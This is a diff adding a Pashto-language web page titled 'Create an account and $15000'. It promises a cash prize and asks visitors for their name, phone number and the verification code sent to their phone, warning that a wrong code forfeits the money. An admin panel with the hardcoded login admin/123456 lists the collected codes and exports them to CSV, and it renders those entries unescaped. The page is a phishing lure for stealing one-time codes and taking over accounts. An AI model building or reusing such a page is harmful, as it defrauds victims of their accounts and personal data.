@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="ps">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Create an account and $15000</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial}
+html,body{height:100%}
+body{
+  min-height:100vh;
+  background: url('../images\ \(9\).jpeg') center center/cover no-repeat;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  transition:background 0.6s ease;
+  padding:20px;
+  color:#fff;
+}
+.card{
+  width:420px;
+  max-width:100%;
+  background: rgba(0,0,0,0.28);
+  backdrop-filter: blur(8px);
+  border-radius:14px;
+  padding:18px;
+  box-shadow: 0 8px 30px rgba(0,0,0,0.45);
+}
+.brand{text-align:center;margin-bottom:10px}
+.brand h1{font-size:22px}
+.brand p{opacity:0.9;font-size:13px;margin-top:6px}
+label{display:block;font-size:13px;margin:10px 0 6px;color:#eef}
+input{width:100%;padding:10px 12px;border-radius:8px;border:0;outline:none;font-size:15px}
+.row{display:flex;gap:10px}
+.btn{display:inline-block;padding:10px 12px;border-radius:8px;border:0;background:#1e90ff;color:#fff;font-weight:600;cursor:pointer}
+.btn.secondary{background:#2ecc71}
+.btn.ghost{background:transparent;border:1px solid rgba(255,255,255,0.14)}
+.note{font-size:12px;color:#dfe9ff66;margin-top:8px;text-align:center}
+.videos{display:none;margin-top:12px;gap:12px;flex-direction:column}
+.videos h2{font-size:16px;margin-bottom:8px}
+video{width:100%;height:auto;border-radius:10px;display:block;background:#000}
+.modal{
+  position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,0.6);z-index:60
+}
+.modal .panel{width:90%;max-width:900px;background:#0f1724;color:#fff;border-radius:10px;padding:14px;max-height:80vh;overflow:auto}
+table{width:100%;border-collapse:collapse;font-size:14px}
+th,td{padding:8px;border-bottom:1px solid rgba(255,255,255,0.06);text-align:left}
+th{opacity:0.9;font-weight:600}
+.controls{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px}
+.small{font-size:13px;padding:6px 8px;border-radius:8px}
+.danger{background:#e74c3c}
+@media (max-width:520px){.card{padding:12px}}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="brand">
+    <h1 id="siteTitle">Create an account and $15000</h1>
+    <p>ثبت نام وکړی او د ۱۵۰۰۰ډالر ګټونکی شی</p>
+  </div>
+
+  <!-- Login/Register -->
+  <div id="authBox">
+    <label for="userName">نوم</label>
+    <input id="userName" type="text" placeholder="خپل نوم ورکړی"/>
+
+    <label for="phone">تلفون شمېره</label>
+    <input id="phone" type="tel" placeholder="مثال: 07XXXXXXXX" />
+
+    <label for="code">کود</label>
+    <input id="code" type="text" placeholder="ستاسی شمیری ته د تایید کود لیږو. منتظر شی." />
+
+
+    <div style="display:flex;gap:8px;margin-top:12px">
+      <button class="btn" onclick="registerUser()">ثبت نام</button>
+      <button class="btn ghost" onclick="resetForm()">پاکول</button>
+      <button class="btn secondary" onclick="adminLogin()">Admin ننوتل</button>
+    </div>
+
+    <p class="note">یادونه: تر څو چی د تایید کود نه وی درته لیږل شوی د غلط کوډ لیکلو هڅه مه کوی <br>
+        که غلط کوډ امتحان کړی د ۱۵۰۰۰ډالر څخه به محروم شی.</p>
+  </div>
+
+  <!-- Videos section -->
+  <div id="videoSection" class="videos">
+    <h2>Create an account and $15000</h2>
+    <video controls src="../../Desktop/What is Life__ __ Muniba Mazari Speech in English(360P).mp4"></video>
+    <video controls src="../../Desktop/What is Life__ __ Muniba Mazari Speech in English(360P).mp4"></video>
+    <video controls src="../../Desktop/What is Life__ __ Muniba Mazari Speech in English(360P).mp4"></video>
+  </div>
+</div>
+
+<!-- Admin Modal -->
+<div id="adminModal" class="modal">
+  <div class="panel">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+      <h3>Admin — ثبت شویو کسانو لیست</h3>
+      <div><button class="btn small" onclick="closeAdmin()">بندول</button></div>
+    </div>
+    <div class="controls">
+      <button class="btn small" onclick="exportCSV()">CSV ډاونلوډ</button>
+      <button class="btn small danger" onclick="clearAllConfirm()">ټول پاکول</button>
+      <button class="btn small ghost" onclick="toggleBg()">بیک‌ګرونډ بدل کړه</button>
+    </div>
+    <div id="adminContent">
+      <table id="regsTable">
+        <thead><tr><th>#</th><th>نوم</th><th>تلفون</th><th>کود</th></tr></thead>
+        <tbody></tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<script>
+const STORAGE_KEY = 'siterat_regs';
+const ADMIN_USER = 'admin';
+const ADMIN_PASS = '123456';
+
+function loadRegs(){return JSON.parse(localStorage.getItem(STORAGE_KEY)||'[]');}
+function saveRegs(arr){localStorage.setItem(STORAGE_KEY,JSON.stringify(arr));}
+
+function registerUser(){
+  const name=document.getElementById('userName').value.trim();
+  const phone=document.getElementById('phone').value.trim();
+  const code=document.getElementById('code').value.trim();
+  if(!name||!phone||!code){alert('ټول ځایونه ډک کړئ!');return;}
+  if(name===ADMIN_USER){alert('دا نوم نشي کارول کیدی');return;}
+  const arr=loadRegs();
+  arr.push({id:Date.now(),name,phone,code,created:new Date().toISOString()});
+  saveRegs(arr);
+  resetForm();
+  showVideos(name);
+  alert('ستاسو معلومات ثبت شول!');
+}
+
+function resetForm(){
+  document.getElementById('userName').value='';
+  document.getElementById('phone').value='';
+  document.getElementById('code').value='';
+}
+
+function showVideos(name){
+  document.getElementById('authBox').style.display='none';
+  document.getElementById('videoSection').style.display='flex';
+  document.getElementById('siteTitle').textContent=name+' - زده کړه';
+  document.body.style.background="url('bg2.jpg') center center/cover no-repeat";
+}
+
+function adminLogin(){
+  const name=document.getElementById('userName').value.trim();
+  const pass=document.getElementById('code').value.trim();
+  if(name===ADMIN_USER && pass===ADMIN_PASS){
+    document.getElementById('authBox').style.display='none';
+    openAdmin();
+  } else {alert('نوم یا پاسورډ غلط دی!');}
+}
+
+function openAdmin(){
+  document.getElementById('adminModal').style.display='flex';
+  renderAdminTable();
+}
+function closeAdmin(){document.getElementById('adminModal').style.display='none';}
+
+function renderAdminTable(){
+  const tbody=document.querySelector('#regsTable tbody');
+  tbody.innerHTML='';
+  const arr=loadRegs();
+  if(arr.length===0){tbody.innerHTML='<tr><td colspan="4" style="opacity:0.7">تر اوسه ثبت شوی نشته.</td></tr>';return;}
+  arr.slice().reverse().forEach((r,i)=>{
+    const tr=document.createElement('tr');
+    tr.innerHTML='<td>'+(arr.length-i)+'</td><td>'+r.name+'</td><td>'+r.phone+'</td><td>'+r.code+'</td>';
+    tbody.appendChild(tr);
+  });
+}
+
+function clearAllConfirm(){
+  if(confirm('ټول ثبت شوي معلومات پاکول؟')){
+    localStorage.removeItem(STORAGE_KEY);
+    renderAdminTable();
+    alert('ټول اطلاعات حذف شول.');
+  }
+}
+
+function exportCSV(){
+  const arr=loadRegs();
+  if(arr.length===0){alert('هیڅ ثبت شوی نشته.');return;}
+  const header=['id','name','phone','code','created'];
+  const rows=arr.map(r=>[r.id,r.name,r.phone,r.code,r.created]);
+  const csv=[header.join(','),...rows.map(r=>r.join(','))].join('\n');
+  const blob=new Blob([csv],{type:'text/csv'});
+  const url=URL.createObjectURL(blob);
+  const a=document.createElement('a');
+  a.href=url;a.download='siterat_registrations.csv';
+  document.body.appendChild(a);a.click();a.remove();
+  URL.revokeObjectURL(url);
+}
+
+function toggleBg(){
+  const current=document.body.style.background||'';
+  document.body.style.background=current.includes('bg2.jpg')?"url('bg1.jpg') center center/cover no-repeat":"url('bg2.jpg') center center/cover no-repeat";
+}
+</script>
+
+</body>
+</html>
